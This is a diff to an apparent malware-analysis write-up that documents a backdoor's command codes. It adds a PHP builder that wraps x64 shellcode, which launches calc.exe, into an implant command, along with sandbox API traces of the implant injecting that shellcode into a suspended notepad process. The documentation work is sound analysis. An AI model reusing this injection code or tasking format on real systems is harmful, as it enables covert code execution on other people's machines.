@@ -54,7 +54,7 @@ Here is a short description of the next 20 command codes and purpose :
 |"\xed\xf2"    | [connect_localhost_global_struct](#connect_localhost_global_struct) | $index |
 |"\xd8\x3b"    | [WriteMemory](#WriteMemory) | $address, $data |
 |"\x3b\xa2"    | [GetUsersPwdHashes](#GetUsersPwdHashes) | NA |
-|"\xd2\xe3"    | [CreateProcessConf3](#CreateProcessConf3) | TODO |
+|"\xd2\xe3"    | [CreateProcessSuspendedInjectThread](#CreateProcessSuspendedInjectThread) |  |
 |"\xd9\xa7"    | [unknown_update_global_struct](#unknown_update_global_struct) | TODO |
 |"\xb3\xd2"    | [StopService](#StopService) | $MachineName, $ServiceName |
 |"\x9a\x6c"    | [DelayCmdExec](#DelayCmdExec) | $delay |
@@ -1945,10 +1945,163 @@ CNT] [625]
 [RET] [0xae2971e028]
 ```
 
-<a id="CreateProcessConf3"></a>
-# CreateProcessConf3  
+<a id="CreateProcessSuspendedInjectThread"></a>
+# CreateProcessSuspendedInjectThread  
 
-TODO  
+```php
+/*
+	This command requires the command line of the created process to be set through another command :
+	For instance : "\xa9\xc3 "5", "notepad";
+
+*/
+function CreateProcessConf3()
+{
+	$buf =  "\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d";
+	$buf =  $buf . "\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01";
+	$buf =  $buf . "\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01";
+	$buf =  $buf . "\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31";
+	$buf =  $buf . "\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45";
+	$buf =  $buf . "\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b";
+	$buf =  $buf . "\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31";
+	$buf =  $buf . "\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2";
+	$buf =  $buf . "\x48\xff\xc2\x48\x83\xec\x28\xff\xd0";
+	
+	$buff_b64 = base64_encode($buf);
+	
+	$cmd_id = "\xd2\xe3 $buff_b64";
+	$cmd_id_b64 = base64_encode($cmd_id);
+	
+	return $cmd_id_b64;
+}
+```
+
+**I. Fetching the order**  
+
+```html
+[CNT] [441]
+[PTP] [0x868] [0x994] [c:\windows\system32\rundll32.exe]
+[API] <CryptStringToBinaryA> in [crypt32.dll] 
+[PAR] LPCTSTR pszString  : 0x0000005762065960
+[STR]         -> "vJ7S4O4DWydoZDlAiZKGGsy+ZejYSNALKR/Z+m/7JFVt6mkPC2JHwa3RCInrYyEANMKocwnwlZNgTpy8e+GFCaDmO68uza2hYP05ZdOeB6f3Saw7FrkmUj7E"
+[STR]            "3HBijUdmlXaWWlcgTG1E3XIaB7zs7PhUhdJf/XKlyDXshsydfUgYhspugDMch169PEE/1qlUdLJ3/koztpRFxNk87U3S6Vo7c5iumADp6UjFuWXx0dKZXJhx"
+[STR]            "VDCSEumGmM0aXMQu4ysNsJzaqYQhQReIN0Jr3Y2xmoKsB6p0CHHxNdzI+M0vfaXkAI/938ik6UPVrYS9EmEu2Z8vlZ5y+5Cs4sA8/7UCdXMzaz3y5eJr+8eK"
+[STR]            "qaVFUELKQs0fUNg5/rKhXB1b67Mfg/K0tGvaT8HumUEGT1VBgbVlQ7hlYP7xVGj5q5Vvm+Vs4qfFWi3KzKlGU8gzRDRf8aK9i5n2a+QWV5QeShMbI470cXHe"
+[STR]            "zcQjxKxLvIsKRtG++4t/xTlECj8BgA=="
+[PAR] DWORD   cchString  : 0x0
+[PAR] DWORD   dwFlags    : 0x1 (CRYPT_STRING_BASE64)
+[PAR] BYTE    *pbBinary  : 0x00000057620321E0
+[PAR] DWORD   *pcbBinary : 0x000000576406EA8C
+[PAR] DWORD   *pdwSkip   : 0x0
+[PAR] DWORD   *pdwFlags  : 0x0
+[RET] [0x5763fcbea1]
+```
+**II. Execution**   
+
+```html
+[CNT] [479]
+[PTP] [0x868] [0xaf8] [c:\windows\system32\rundll32.exe]
+[API] <RtlAdjustPrivilege> in [ntdll.dll] 
+[PAR] ULONG    Privilege  : 0x14
+[PAR] BOOLEAN  Enable     : 0x1
+[PAR] BOOLEAN  Client     : 0x0
+[PAR] PBOOLEAN WasEnabled : 0x00000057646DEEEC
+[RET] [0x5763fc9a5c]
+
+[CNT] [483]
+[PTP] [0x868] [0xaf8] [c:\windows\system32\rundll32.exe]
+[API] <CreatePipe> in [KERNEL32.DLL] 
+[PAR] PHANDLE               hReadPipe        : 0x00000057646DDDE8
+[PAR] PHANDLE               hWritePipe       : 0x00000057646DDDF0
+[PAR] LPSECURITY_ATTRIBUTES lpPipeAttributes : 0x00000057646DDE28
+[PAR] DWORD                 nSize            : 0x0
+[RET] [0x5763fdb70d]
+
+[ * ] [pid 0x868][tid 0xaf8] c:\windows\system32\rundll32.exe
+[API] <CreatePipe>
+[PAR] HANDLE  hReadPipe  : 0x37c
+[PAR] HANDLE  hWritePipe : 0x3a0
+[RES] BOOL 0x1
+
+[CNT] [486]
+[PTP] [0x868] [0xaf8] [c:\windows\system32\rundll32.exe]
+[API] <SetHandleInformation> in [KERNEL32.DLL] 
+[PAR] HANDLE hObject : 0x37c
+[PAR] DWORD dwMask   : 0x1
+[PAR] DWORD dwFlags  : 0x0
+[RET] [0x5763fdb72b]
+
+[CNT] [495]
+[PTP] [0x868] [0xaf8] [c:\windows\system32\rundll32.exe]
+[API] <CreateProcessA> in [KERNEL32.DLL] 
+[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
+[PAR] LPCTSTR               lpCommandLine        : 0x000000576202A180
+[STR]                       -> "notepad"
+[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
+[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
+[PAR] BOOL                  bInheritHandles      : 0x1
+[PAR] DWORD                 dwCreationFlags      : 0x8000004 (CREATE_NO_WINDOW | CREATE_SUSPENDED)
+[PAR] LPVOID                lpEnvironment        : 0x0
+[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
+[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x00000057646DDE40
+[FLD]                       -> lpDesktop   = 0x0 (null)
+[FLD]                       -> lpTitle     = 0x0 (null)
+[FLD]                       -> dwFlags     = 0x100 (STARTF_USESTDHANDLES)
+[FLD]                       -> wShowWindow = 0x0
+[FLD]                       -> hStdInput   = 0x0
+[FLD]                       -> hStdOutput  = 0x3a0
+[FLD]                       -> hStdError   = 0x3a0
+[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x00000057646DDE10
+[RET] [0x5763fdb8ee]
+
+[CNT] [508]
+[PTP] [0x868] [0xaf8] [c:\windows\system32\rundll32.exe]
+[API] <VirtualAllocEx> in [KERNEL32.DLL] 
+[PAR] HANDLE hProcess         : 0x388
+[PAR] LPVOID lpAddress        : 0x0
+[PAR] SIZE_T dwSize           : 0xbe
+[PAR] DWORD  flAllocationType : 0x3000
+[PAR] DWORD  flProtect        : 0x4 (PAGE_READWRITE)
+[RET] [0x5763fb6395]
+
+[CNT] [509]
+[PTP] [0x868] [0xaf8] [c:\windows\system32\rundll32.exe]
+[API] <WriteProcessMemory> in [KERNEL32.DLL] 
+[PAR] HANDLE  hProcess      : 0x388
+[PAR] LPVOID  lpBaseAddress : 0x000000B124550000
+[PAR] LPCVOID lpBuffer      : 0x0000005762023CD0
+[PAR] SIZE_T  nSize         : 0xbd
+[RET] [0x5763fb63bd]
+
+[CNT] [510]
+[PTP] [0x868] [0xaf8] [c:\windows\system32\rundll32.exe]
+[API] <VirtualProtectEx> in [KERNEL32.DLL] 
+[PAR] HANDLE hProcess     : 0x388
+[PAR] LPVOID lpAddress    : 0x000000B124550000
+[PAR] SIZE_T dwSize       : 0xbe
+[PAR] DWORD  flNewProtect : 0x20 (PAGE_EXECUTE_READ)
+[RET] [0x5763fb63e4]
+
+[CNT] [521]
+[PTP] [0x868] [0xaf8] [c:\windows\system32\rundll32.exe]
+[API] <CreateRemoteThread> in [KERNEL32.DLL] 
+[PAR] HANDLE                 hProcess           : 0x388
+[PAR] LPSECURITY_ATTRIBUTES  lpThreadAttributes : 0x0
+[PAR] SIZE_T                 dwStackSize        : 0x100000
+[PAR] LPTHREAD_START_ROUTINE lpStartAddress     : 0x000000B124550014
+[PAR] LPVOID                 lpParameter        : 0x0
+[PAR] DWORD                  dwCreationFlags    : 0x0
+[PAR] LPDWORD                lpThreadId         : 0x00000057646DD694
+[RET] [0x5763fb5e93]
+
+[CNT] [529]
+[PTP] [0xbf8] [0x5b4] [c:\windows\system32\notepad.exe]
+[API] <WinExec> in [KERNEL32.DLL] 
+[PAR] LPCSTR lpCmdLine : 0x000000B12465F8A8
+[STR]        -> "calc.exe"
+[RET] [0xb1245500bd]
+```
+
+
 
 <a id="unknown_update_global_struct"></a>
 # unknown_update_global_struct  
